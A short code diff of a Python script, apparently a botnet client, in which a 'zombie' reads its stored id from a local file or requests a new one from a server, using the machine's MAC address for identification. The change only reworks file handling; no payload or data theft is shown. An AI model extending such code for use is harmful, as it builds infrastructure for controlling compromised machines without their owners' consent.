@@ -1,3 +1,4 @@
+from sys import excepthook
 from urllib.request import urlopen
 from time import sleep
 import uuid # this gives us the mac address of the machine as a 48 bit positive enteger
@@ -11,10 +12,12 @@ def get_zid_from_server():
         return zid
 
 # try to read zombie id. if there is nothing to read, this must be a new zombie so request for an id
-with open('zid', 'a+') as file:
-    zid = file.read()
-    if zid == "":
-        zid = get_zid_from_server()
+try:
+    with open('zid', 'r') as file:
+        zid = file.read()
+except FileNotFoundError:
+    zid = get_zid_from_server()
+    with open('zid', 'w') as file:
         file.write(zid)
 
 
